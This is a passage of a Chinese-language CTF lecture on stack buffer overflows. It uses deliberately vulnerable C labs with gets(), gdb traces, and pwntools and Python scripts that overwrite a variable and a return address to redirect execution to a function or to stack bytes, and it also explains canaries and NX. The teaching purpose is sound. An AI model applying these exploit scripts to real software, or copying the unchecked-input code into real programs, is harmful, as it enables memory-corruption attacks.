# PWN_0x1
## outline
- stack overflow (使用 IDA 配合 Pwn tool)
- 關於虛擬記憶體地址與實體記憶體地址 (作業系統中記憶體管理概念)
- buffer overflow 
- heap overflow
- execute shellcode on memory page
- format string 問題

## 前言
在上一堂課中，我們了解到一個 C 語言原始碼是如何變成一個可執行檔的，並且分析了執行檔格式，也就是 ELF 格式，並且了解到 x86 在 32 位元程式與 64 位元程式呼叫慣例的不同，並看到在程式載入到記憶體中，stack 是如何運作的，以及 stack frame, return address, `rsp`, `rbp` 暫存器的作用。

我們在 stack frame 中，了解到我們是通過 stack 中的 return address 去回到呼叫者 (caller) 的函式中，如果我們使用了一些像是 `scanf` 或是　`get` 等等函式，我們可能有機會將 stack 中存放的 return address 進行覆蓋，達到控制程式執行流程的目的。

而上面將存取範圍外的資料進行覆蓋 (像是覆蓋掉 return address)，我們稱之為 overflow，overflow 的產生會覆蓋掉不應該覆蓋的資料，而這邊我們將 overflow 分成三種進行介紹，分別為 buffer overflow, stack overflow, heap overflow。

## Stack Overflow
### 控制無法被控制的變數
回到上一週課程我們看到的 stack frame 圖，了解 buffer overflow 的概念
![](https://hackmd.io/_uploads/r1UU1SPN3.png)
這是上一週上課時我們所看到的經過 `main` 函式呼叫以及 `func` 函式呼叫的 stack 分佈情況，而在函式中如果存在一個區域變數，我們知道他會位於 stack frame 中，假設 `func` 中有一個 `char buf[8]` 以及其他變數的情況，看起來分佈如下
<img src="https://hackmd.io/_uploads/SyxwR1hEn.png" width=300>
如果我們使用 `gets` 或是 `scanf` 等等沒有檢查邊界的函式，例如使用 `gets` 將使用者輸入的字串儲存到 `char a[8]` 中，則可能看起來如以下表示
<img src="https://hackmd.io/_uploads/SydzlgnN3.png" width=300>
發生因為沒有檢查邊界，導致其他區域的資料遭到覆蓋，這是 buffer overflow 所造成的問題。

以下我們嘗試一個範例，使用 `gdb` 驗證 Buffer overflow 的問題
## Lab1: Stack_1
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int got_permissions;
  char buffer[64];

  got_permissions = 0;
  gets(buffer);

  if(got_permissions != 0) {
      printf("Access Acept, Welcome to HackerSir\n");
  } else {
      printf("Access Denied\n");
  }
}
```
使用以下指令進行編譯
```
all:
	gcc -g -fno-stack-protector stack_1.c -o stack_1

```
`-fno-stack-protector` 表示關閉 stack 中的保護機制。接著我們嘗試使用 gdb 執行執行檔，並通過 `dissasemble main` 得到 `main` 函式的組合語言程式碼
```asm
   0x0000000000001169 <+0>:     endbr64 
   0x000000000000116d <+4>:     push   rbp
   0x000000000000116e <+5>:     mov    rbp,rsp
   0x0000000000001171 <+8>:     sub    rsp,0x60
   0x0000000000001175 <+12>:    mov    DWORD PTR [rbp-0x54],edi
   0x0000000000001178 <+15>:    mov    QWORD PTR [rbp-0x60],rsi
   0x000000000000117c <+19>:    mov    DWORD PTR [rbp-0x4],0x0
   0x0000000000001183 <+26>:    lea    rax,[rbp-0x50]
   0x0000000000001187 <+30>:    mov    rdi,rax
   0x000000000000118a <+33>:    mov    eax,0x0
   0x000000000000118f <+38>:    call   0x1070 <gets@plt>
   0x0000000000001194 <+43>:    mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000001197 <+46>:    test   eax,eax
   0x0000000000001199 <+48>:    je     0x11ac <main+67>
   0x000000000000119b <+50>:    lea    rax,[rip+0xe66]        # 0x2008
   0x00000000000011a2 <+57>:    mov    rdi,rax
   0x00000000000011a5 <+60>:    call   0x1060 <puts@plt>
   0x00000000000011aa <+65>:    jmp    0x11bb <main+82>
   0x00000000000011ac <+67>:    lea    rax,[rip+0xe78]        # 0x202b
   0x00000000000011b3 <+74>:    mov    rdi,rax
   0x00000000000011b6 <+77>:    call   0x1060 <puts@plt>
   0x00000000000011bb <+82>:    mov    eax,0x0
   0x00000000000011c0 <+87>:    leave  
   0x00000000000011c1 <+88>:    ret
```
開始分析上面組合語言邏輯，通過 `sub rsp, 0x60` 在 stack 上空出空間給 function 使用，接著我們看到 `lea rax, [rbp-0x50]`，`lea` 表示 Load Effective Address，將一個有效的記憶體載入到 `rax` 暫存器中，記憶體地址為 `rbp` 中的數值扣除 `0x50` 得到，也就是一個位於 stack frame 上的記憶體地址。

接著我們把 `rax` 放到 `rdi` 中，接著下面呼叫 `gets`，從這裡我們知道，`rdi` 為函式的第一個參數，也就是 `gets` 讀取到的字串會放置於 `rdi` 所指向的記憶體地址，`rdi` 裡面為 `rax` 的值，指向到 stack frame 其中一個區域，也就是我們輸入的字串會直接放在 stack frame 中，對應到上方 stack frame 的圖。

輸入字串為 `AAAAAABBBBBBB`
```
gdb-peda$ x/10w ($rbp-0x50)
0x7fffffffda60: 0x41414141      0x42424141      0x42424242      0x00000042
0x7fffffffda70: 0xf7fc1000      0x00007fff      0x01000000      0x00000101
0x7fffffffda80: 0x00000002      0x00000000
```
上方為記憶體中 stack 區域，由資料於記憶體中的排列方式，我們可以再度驗證 x86 架構底下為 little endian。(這邊可以注意到我們輸入的字串，我們可以以 4 個 4 個一組，如 `AAAABBBB`，這樣我們在 stack 中為 `0x41414141 0x42424242`，方便我們去尋找要覆蓋的位置)

在本實驗中，我們希望通過 `gets` 將 `got_permissions` 的值覆蓋掉，我們可以使用 `gdb` 中 `define hook-stop` 的功能定義一個 `hook function`，`hook-stop` 意義為每當我們因為中斷點停止時，會先去執行 `hook-stop` 裡面定義的 `hook function`，接著在繼續執行程式。

我們試著定義 `hook-stop`
```
gdb-peda$ define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>info registers
>x/24wx $rsp
>x/2i $rip
>end
```
我們希望在每一次因為中斷點導致中斷時，印出所有暫存器，`esp` 暫存器後面 24 個 word 大小，也就是 24 乘上 32 bit 的數量，`wx` 表示以 16 進位方式顯示記憶體中的內容，以 32 bit = 4 bytes 為一組。整個意義上為印出 stack 區域中，也就是 `esp` 指向的記憶體地址後 24 個 word 大小的資料。

`x/2i $eip` 表示印出 `eip` 後面將要執行的兩個指令。

我們在 `gets` 指令之前與之後下中斷點
```
b main
b *main+38
b *main+43
```

接著我們執行，輸入 `AAAABBBBCCCC`，並查看結果
```
AAAABBBBCCCC
rax            0x7fffffffda60      0x7fffffffda60
rbx            0x0                 0x0
rcx            0x7ffff7e19aa0      0x7ffff7e19aa0
rdx            0x1                 0x1
rsi            0x1                 0x1
rdi            0x7ffff7e1ba80      0x7ffff7e1ba80
rbp            0x7fffffffdab0      0x7fffffffdab0
rsp            0x7fffffffda50      0x7fffffffda50
r8             0x0                 0x0
r9             0x0                 0x0
r10            0x77                0x77
r11            0x246               0x246
r12            0x7fffffffdbc8      0x7fffffffdbc8
r13            0x555555555169      0x555555555169
r14            0x555555557db8      0x555555557db8
r15            0x7ffff7ffd040      0x7ffff7ffd040
rip            0x555555555194      0x555555555194 <main+43>
eflags         0x206               [ PF IF ]
cs             0x33                0x33
ss             0x2b                0x2b
ds             0x0                 0x0
es             0x0                 0x0
fs             0x0                 0x0
gs             0x0                 0x0
0x7fffffffda50: 0xffffdbc8      0x00007fff      0xf7fe285c      0x00000001
0x7fffffffda60: 0x41414141      0x42424242      0x43434343      0x00007f00
0x7fffffffda70: 0xf7fc1000      0x00007fff      0x01000000      0x00000101
0x7fffffffda80: 0x00000002      0x00000000      0x178bfbff      0x00000000
0x7fffffffda90: 0xffffdfc9      0x00007fff      0x00000064      0x00000000
0x7fffffffdaa0: 0x00001000      0x00000000      0x55555080      0x00000000
=> 0x555555555194 <main+43>:    mov    eax,DWORD PTR [rbp-0x4]
   0x555555555197 <main+46>:    test   eax,eax

Breakpoint 3, main (argc=0x1, argv=0x7fffffffdbc8) at stack_1.c:13
13        if(got_permissions != 0) {

```
我們可以看到，`0x7fffffffda60` 開始的位置出現了我們剛剛輸入的資料，而我們可以試著查看 `got_permission` 的值，也就是 `rbp - 0x4` 的值
```
gdb-peda$ x/w $rbp - 0x4
0x7fffffffdaac: 0x00000000
```
我們輸入的字串不夠長到去覆蓋掉 `0x7fffffffdaac` 的位置，我們可以試著計算我們需要輸入多長的字串才能將 `got_permission` 覆蓋成其他的數值
```
0x7fffffffdaac - 0x7fffffffda60 = 0x4c
```
也就是我們需要輸入 `0x4c` 個字元才能夠進行覆蓋，我們是試著改寫我們輸入的字串 (我們輸入的這一段字串，又稱為 payload)

我們將 `'A' * 0x4c + 'B'` 作為輸入，預期會將 `got_permisson` 覆蓋成 `'B'`

```
gdb-peda$ x/w $rbp - 0x4
0x7fffffffdaac: 0x00000042
```

我們看到我們成功將 `got_permission` 覆蓋成 `0x42` 了，也就是 `'B'`，接著我們跳出 gdb 試著使用這個字串作為輸入，我們可以使用 pipe 的技巧進行輸入，以下範例
```shell
$ python3 -c "print('a' * 0x4c + 'b')" | ./stack_1
Access Acept, Welcome to HackerSir
```
`python3 -c` 可以讓我們直接執行 `""` 內的程式碼，而 `|` 為 pipe，作用為將 `|` 左邊的輸出作為右邊部份的輸入，以上方指令意義為將 `python3 -c` 執行的結果作為 `./stack_1` 的輸入。

這裡我們成功完成通過 stack overflow 去覆蓋無法被變更的變數。

### pwntools
pwntools 為使用 python 撰寫，用於 CTF 以及 exploit 開發的函式庫，可以用來解析 ELF，本地啟動 process，以及各種與 process 互動的工具，shellcode 產生等等，下面為一個使用 pwntools 練習 Lab1 的範例
```py
from pwn import *

# Start the process
p = process('./stack_1')

# Payload
payload = 'a' * 0x4c + 'b'

# Send the input
p.sendline(payload)

# Receive the output
output = p.recvall().decode()

# Print the output
print(output)

```

```
python3 script.py
[+] Starting local process './stack_1': pid 11943
/home/ubuntu/Desktop/workspace/PWN_Lec/Lec1/Lab/stack_1/script.py:7: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline('a' * 0x4c + 'b')
[+] Receiving all data: Done (35B)
[*] Process './stack_1' stopped with exit code 0 (pid 11943)
Access Acept, Welcome to HackerSir
```

在上面 python 腳本中，我們在本地啟動了 `stack_1` 的 process，並且使用 sendline 將 `'a' * 0x4c + 'b'` 作為我們的輸入，接著通過 `output` 去獲得 `stack_1` 輸出的結果。


> 關於 payload 的概念:
>
> payload 中文意義為對於某人重要的訊息，字面上來說我們很難去理解他的意思，我們從一個> 例子去看待 payload 的概念
> 
> 假設今天 alice 要寄信給 bob，在信件上，有寄件人，目的地地址，信件內容等等。
> 
> 對於郵差而言，信件中真正重要的部分為寄件地址，因此寄件地址對於郵差來說為 payload。
> 
> 對於 bob 而言，信件中真正重要的部分為信件內容，因此信件內容對於 bob 來說為 payload。
> 
> 以我們上面撰寫的腳本來說，整個 python 腳本稱為 exploit，而腳本中對於我們而言，真正重要的部分為 `'a' * 0x4c + 'b'`，這個部分才是觸發 overflow 的關鍵，因此對於我們來說，`'a' * 0x4c + 'b'` 為 payload。

## Lab2: Stack_2
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include "c8763.c"

extern void c8763(void);
int main(int argc, char **argv)
{
  volatile int got_permissions;
  char buffer[64];

  got_permissions = 0;
  gets(buffer);

  if(got_permissions != 0xc8763) {
      c8763();
  } else {
      printf("Access Denied\n");
  }
}
```
Lab2 為 Lab1 的變形，需要把 `got_permissions` 覆蓋成 `0xc8763`，這一題主要需要注意 little endian 的問題。
```py
from pwn import *

# Start the process
p = process('./stack_2')

# Payload
payload = b'a' * 0x4c + b"\x63\x87\x0c"

# Send the input
p.sendline(payload)

# Receive the output
output = p.recvall().decode()

# Print the output
print(output)
```

這裡我們可以使用 pwntool 中的工具，將 `0xc8763` 轉換成 little endian 的格式
```py
from pwn import *

# Start the process
p = process('./stack_2')

# Payload
payload = b'a' * 0x4c + p32(0xc8763)

# Send the input
p.sendline(payload)

# Receive the output
output = p.recvall().decode()

# Print the output
print(output)
```
這裡如果我們要直接輸入，會發現到有一些字元是無法直接輸入的 (因為超出 ASCII 表的範圍，像是 `0x87`)，這邊可以看出使用 pwntools 的方便之處。

## Lab3: Stack_3
在上面的 Lab 中，我們學會了如何通過 buffer overflow 去控制其他變數的值，現在我們將要跳出 stack frame，去嘗試覆蓋 retrun address 的值，以下為實驗程式碼
```c
#include <stdio.h>
#include <stdlib.h>

void func() {
    printf("how did you do that???\n");
}

int main(void){
    char buf[64];

    gets(buf);
}
```

回顧 stack 分佈情況，我們可以通過讓 stack frame 中的變數溢出，進而造成其他區域的資料更動，以下圖的範例而言，我們便是通過 stack frame 中的變數溢出將 return address 覆蓋。

<img src="https://hackmd.io/_uploads/SJZFoGT4h.png" width=300>

首先我們先構造一段輸入 `
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
`
接著我們通過 `gdb` 執行程式
```
[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7ffff7e19aa0 --> 0xfbad2288 
RDX: 0x1 
RSI: 0x1 
RDI: 0x7ffff7e1ba80 --> 0x0 
RBP: 0x5252525251515151 ('QQQQRRRR')
RSP: 0x7fffffffdab8 ("SSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
RIP: 0x5555555551a6 (<main+35>: ret)
R8 : 0x0 
R9 : 0x0 
R10: 0x77 ('w')
R11: 0x246 
R12: 0x7fffffffdbc8 --> 0x7fffffffdfde ("/home/ubuntu/Desktop/workspace/PWN_Lec/Lec1/Lab/stack_3/stack_3")
R13: 0x555555555183 (<main>:    endbr64)
R14: 0x555555557db8 --> 0x555555555120 (<__do_global_dtors_aux>:        endbr64)
R15: 0x7ffff7ffd040 --> 0x7ffff7ffe2e0 --> 0x555555554000 --> 0x10102464c457f
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x55555555519b <main+24>:    call   0x555555555070 <gets@plt>
   0x5555555551a0 <main+29>:    mov    eax,0x0
   0x5555555551a5 <main+34>:    leave  
=> 0x5555555551a6 <main+35>:    ret    
   0x5555555551a7:      add    bl,dh
   0x5555555551a9 <_fini+1>:    nop    edx
   0x5555555551ac <_fini+4>:    sub    rsp,0x8
   0x5555555551b0 <_fini+8>:    add    rsp,0x8
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdab8 ("SSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
0008| 0x7fffffffdac0 ("UUUUVVVVWWWWXXXXYYYYZZZZAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
0016| 0x7fffffffdac8 ("WWWWXXXXYYYYZZZZAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
0024| 0x7fffffffdad0 ("YYYYZZZZAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
0032| 0x7fffffffdad8 ("AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
0040| 0x7fffffffdae0 ("CCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
0048| 0x7fffffffdae8 ("EEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
0056| 0x7fffffffdaf0 ("GGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00005555555551a6 in main () at stack_3.c:12
12      }
```
我們發現到，`rbp` 的內容為 `QQQQRRRR`，而根據我們先前學到的 stack 分佈情況，`rbp` 接著往高位記憶體地址走，便會來到 `return address` 的位置，這邊我們重新構造 payload，概念上為 `AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP + rsp + return address (rip)`，`rsp` 和 `rip` 皆為 8 bytes。前面 `AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP` 用於填充 stack 的部份我們會稱為 padding。

```py
from pwn import *

# Start the process
p = process('./stack_3', level="debug")

# Payload
padding = b"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP"
rbp = b"12345678"
rip = p64(0x401156)
payload = padding + rbp + rip

# Send the input
p.sendline(payload)

# # Receive the output
output = p.recvall().decode()

# # Print the output
print(output)

```
以下為執行結果
```shell
$ python3 script.py
[+] Starting local process './stack_3': pid 12294
[+] Receiving all data: Done (23B)
[*] Process './stack_3' stopped with exit code -11 (SIGSEGV) (pid 12294)
how did you do that???

❯ python3 script.py
[+] Starting local process './stack_3' argv=[b'./stack_3'] : pid 12343
[DEBUG] Sent 0x51 bytes:
    00000000  41 41 41 41  42 42 42 42  43 43 43 43  44 44 44 44  │AAAA│BBBB│CCCC│DDDD│
    00000010  45 45 45 45  46 46 46 46  47 47 47 47  48 48 48 48  │EEEE│FFFF│GGGG│HHHH│
    00000020  49 49 49 49  4a 4a 4a 4a  4b 4b 4b 4b  4c 4c 4c 4c  │IIII│JJJJ│KKKK│LLLL│
    00000030  4d 4d 4d 4d  4e 4e 4e 4e  4f 4f 4f 4f  50 50 50 50  │MMMM│NNNN│OOOO│PPPP│
    00000040  31 32 33 34  35 36 37 38  56 11 40 00  00 00 00 00  │1234│5678│V·@·│····│
    00000050  0a                                                  │·│
    00000051
[+] Receiving all data: Done (23B)
[DEBUG] Received 0x17 bytes:
    b'how did you do that???\n'
[*] Process './stack_3' stopped with exit code -11 (SIGSEGV) (pid 12343)
how did you do that???
```

## Canary
Stack Canary，Canary 為金絲雀的意思，為早期用於探查礦坑中是否存在煤氣洩漏或是一氧化碳洩漏，具有預警的作用，而 Stack Canary 為用於防止運用 Stack overflow 攻擊成立的技術，有時候也被稱作為 Stack cookies。

Canary 為在 Stack 中的隨機數字，在程式載入到記憶體中時隨機產生並儲存在比 return address 還要更低的位置，如果我們要使用 Stack overflow 去覆蓋 return address，如上面的 Lab 操作，就會因為覆蓋掉的 stack 和原先 Canary 放置的數值不相等，導致 Stack overflow 被偵測到，並發出 stack smashing detected 的錯誤，並中斷程式，以下範例
```c
#include <stdio.h>

int main(void) {
    char buf[10];
    gets(buf);
}
```
```shell
r$ ./canary
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
*** stack smashing detected ***: terminated
Aborted
```
可以發現到一但偵測到 Stack overflow，便終止程式，這也是為什麼我們前面的 Lab 都會加上 `-fno-stack-protector` 的選項，就是為了關閉 stack 區域的保護機制。

## NX
NX 表示 No-eXcute，表示不可執行，原理是將資料所在的記憶體分頁，例如前一堂課介紹到的 stack 和 heap 標記成不可執行，如果我們程式讓程式 oveflow，將 return address 覆蓋成 stack pointer 的位置，並且在 stack 中放入 shellcode，當程式產生 overflow 並準備跳轉到 stack pointer 的位置去執行 shellcode 的時候，作業系統便會發出 Exception，阻止程式繼續執行。

通常這樣的技術又被稱為 executable space protection，用來防止程式碼注入導致的任意執行程式行為。在 Windows 中，這樣的技術被稱為資料執行保護 DEP (Data Execution Protect)，在 Linux 中，有 NX, W^X, PaX 等等。

NX 的具體實現，牽涉到軟體層面和硬體層面，在硬體層面，會運用處理器中 NX bit，對應到的分頁中某一個 bit 進行設定，0 表示不可執行，1 表示可以執行。如果有一個 Program Counter 指向到受保護的記憶體分頁，就會觸發硬體層面的 Exception。而在軟體層面，作業系統需要支援 NX，用來正確的分配記憶體分頁，在作業系統中，我們可以看到如 Linux 中存在 `mmap` 等函式，可以用來設置記憶體分頁權限或是改變記憶體分頁權限。
## Lab4: BOF_Shellcode
```c
#include <stdio.h>

int main(void) 
{
    char buf[64];
    get(buf);
}
```
相比於 Lab 3，我們發現到我們少了 `func` 可以用來跳轉，這題的目標為我們通過 buffer overflow，跳轉到 Stack 上面某一個位置，而該位置放置的為我們構造的 Shellcode，達到通過 Buffer Overflow 執行 Shellcode 的目標。

首先我們同樣輸入 `AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ`，在 `main+22` 的地方下一個中斷點，接著執行
```
[----------------------------------registers-----------------------------------]
EAX: 0xffffccd0 ("AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
EBX: 0xf7e2a000 --> 0x229dac 
ECX: 0xf7e2b9c0 --> 0x0 
EDX: 0x1 
ESI: 0xffffcdd4 --> 0xffffcff0 ("/home/ubuntu/Desktop/workspace/PWN_Lec/Lec1/Lab/test/stack5")
EDI: 0xf7ffcb80 --> 0x0 
EBP: 0x54545454 ('TTTT')
ESP: 0xffffcd1c ("UUUUVVVVWWWWXXXXYYYYZZZZ")
EIP: 0x80483da (<main+22>:      ret)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
```
發現到 `ebp` 的值變成 `TTTT`，因此，我們知道 padding 為 `AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRR` + `ebp` + `eip (return address)`。接著我們要思考，這裡沒有了 `func` 提供給我們進行跳轉，那麼 `eip` 要放入什麼值？我們會放入 shellcode 開始的記憶體地址，那麼現在 shellcode 的記憶體地址為何？

我們查看目前 `gdb` 暫存器以及 stack 情況
```
[----------------------------------registers-----------------------------------]
EAX: 0xffffccd0 ("AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
EBX: 0xf7e2a000 --> 0x229dac 
ECX: 0xf7e2b9c0 --> 0x0 
EDX: 0x1 
ESI: 0xffffcdd4 --> 0xffffcff0 ("/home/ubuntu/Desktop/workspace/PWN_Lec/Lec1/Lab/test/stack5")
EDI: 0xf7ffcb80 --> 0x0 
EBP: 0x54545454 ('TTTT')
ESP: 0xffffcd20 ("VVVVWWWWXXXXYYYYZZZZ")
EIP: 0x55555555 ('UUUU')
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x55555555
[------------------------------------stack-------------------------------------]
0000| 0xffffcd20 ("VVVVWWWWXXXXYYYYZZZZ")
0004| 0xffffcd24 ("WWWWXXXXYYYYZZZZ")
0008| 0xffffcd28 ("XXXXYYYYZZZZ")
0012| 0xffffcd2c ("YYYYZZZZ")
0016| 0xffffcd30 ("ZZZZ")
0020| 0xffffcd34 --> 0x8048300 (<__libc_start_main@plt+8>:      add    BYTE PTR [eax],al)
0024| 0xffffcd38 --> 0x1 
0028| 0xffffcd3c --> 0xffffcdd4 --> 0xffffcff0 ("/home/ubuntu/Desktop/workspace/PWN_Lec/Lec1/Lab/test/stack5")
[------------------------------------------------------------------------------]
```
首先出現了 `Invalid $PC address: 0x55555555`，這個記憶體就是我們接下來要 return address 的位置，我們知道他位於 Stack Frame 下方 8 個 bytes，也就是 `ebp` 的值，接著我們看到 stack 區域，我們發現到 stack 區域也被我們進行覆蓋了，而覆蓋的位置正式 `esp` 所指向的位置，因此這邊如果我們將 return address 設置為 `esp` 所在的位置，接著我們跳轉執行的程式碼，便會是畫面中 `VVVVWWWW...` 的部份了，因此，我們選擇將 `eip` 設定為程式執行後 `esp` 所在位置。

我們跳轉到 `esp` 位置後，就可以決定我們要執行的程式碼內容，也就是 Shellcode，我們可以使用 `\xCC` 這個機器指令，背後代表 Trap (Exception) 來測試，如果成功，則作業系統會發出 Trap 的 Signal，我們在 gdb 中進行測試

使用 python2 撰寫腳本 (使用 python2 方便快速印出 2 進位輸出)
```py
import struct
padding ="AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMOOOOPPPPQQQQRRRRSSSS"
ebp = "TTTT"
eip = struct.pack("I", 0xffffcd20)
shellcode = "\xCC" * 4
payload = padding + ebp + eip + shellcode
print payload
```
接著將 python2 輸出成腳本
```shell
$ python2 script.py > payload
```
使用 gdb 在 `main+22` 下中斷點，接著將 payload 導入輸入並執行 (使用 `r < payload`)
```
[----------------------------------registers-----------------------------------]
EAX: 0xffffccd0 ("AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMOOOOPPPPQQQQRRRRSSSSTTTT \315\377\377\314\314\314", <incomplete sequence \314>)
EBX: 0xf7e2a000 --> 0x229dac 
ECX: 0xf7e2b9c0 --> 0x0 
EDX: 0x1 
ESI: 0xffffcdd4 --> 0xffffcff0 ("/home/ubuntu/Desktop/workspace/PWN_Lec/Lec1/Lab/test/stack5")
EDI: 0xf7ffcb80 --> 0x0 
EBP: 0x54545454 ('TTTT')
ESP: 0xffffcd1c --> 0xffffcd20 --> 0xcccccccc 
EIP: 0x80483da (<main+22>:      ret)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[------------------------------------stack-------------------------------------]
0000| 0xffffcd1c --> 0xffffcd20 --> 0xcccccccc 
0004| 0xffffcd20 --> 0xcccccccc 
0008| 0xffffcd24 --> 0xffffcd00 ("MMMMOOOOPPPPQQQQRRRRSSSSTTTT \315\377\377\314\314\314", <incomplete sequence \314>)
0012| 0xffffcd28 --> 0xffffcddc --> 0xffffd02c ("SHELL=/usr/bin/zsh")
0016| 0xffffcd2c --> 0xffffcd40 --> 0xf7e2a000 --> 0x229dac 
0020| 0xffffcd30 --> 0xf7e2a000 --> 0x229dac 
0024| 0xffffcd34 --> 0x80483c4 (<main>: push   ebp)
0028| 0xffffcd38 --> 0x1 
[------------------------------------------------------------------------------]
```
先看到 `esp` 的部份，可以看到接下來要跳轉的記憶體地址為 `0xffffcd20`，也就是圖上 stack 所在位置，接著觀察 stack，可以看到 stack 中存在 `0xcccccccc`，也就是我們輸入的機器碼，接著輸入 `c` 繼續執行
```
[----------------------------------registers-----------------------------------]
EAX: 0xffffccd0 ("AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMOOOOPPPPQQQQRRRRSSSSTTTT \315\377\377\314\314\314", <incomplete sequence \314>)
EBX: 0xf7e2a000 --> 0x229dac 
ECX: 0xf7e2b9c0 --> 0x0 
EDX: 0x1 
ESI: 0xffffcdd4 --> 0xffffcff0 ("/home/ubuntu/Desktop/workspace/PWN_Lec/Lec1/Lab/test/stack5")
EDI: 0xf7ffcb80 --> 0x0 
EBP: 0x54545454 ('TTTT')
ESP: 0xffffcd20 --> 0xcccccccc 
EIP: 0xffffcd21 --> 0xcccccc
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
=> 0xffffcd21:  int3   
   0xffffcd22:  int3   
   0xffffcd23:  int3   
   0xffffcd24:  add    ch,cl
[------------------------------------stack-------------------------------------]
0000| 0xffffcd20 --> 0xcccccccc 
0004| 0xffffcd24 --> 0xffffcd00 ("MMMMOOOOPPPPQQQQRRRRSSSSTTTT \315\377\377\314\314\314", <incomplete sequence \314>)
0008| 0xffffcd28 --> 0xffffcddc --> 0xffffd02c ("SHELL=/usr/bin/zsh")
0012| 0xffffcd2c --> 0xffffcd40 --> 0xf7e2a000 --> 0x229dac 
0016| 0xffffcd30 --> 0xf7e2a000 --> 0x229dac 
0020| 0xffffcd34 --> 0x80483c4 (<main>: push   ebp)
0024| 0xffffcd38 --> 0x1 
0028| 0xffffcd3c --> 0xffffcdd4 --> 0xffffcff0 ("/home/ubuntu/Desktop/workspace/PWN_Lec/Lec1/Lab/test/stack5")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGTRAP
0xffffcd21 in ?? ()
```
看到 `Stopped reason: SIGTRAP`，表示我們成功觸發 Trap，收到作業系統發起的 Exception 了，接著，我們試試看是否能夠在 gdb 外面執行這一段程式
```shell
$ python2 script.py | ./stack5
[1]    16789 done                                        python2 script.py | 
       16790 illegal hardware instruction (core dumped)  ./stack5
```
我們發現出現了 illegal hardware instruction 的錯誤，這是因為我們的 Shellcode 沒有被正確的執行，我們想像我們有下面這一段程式碼
```
do something A
do something B
```
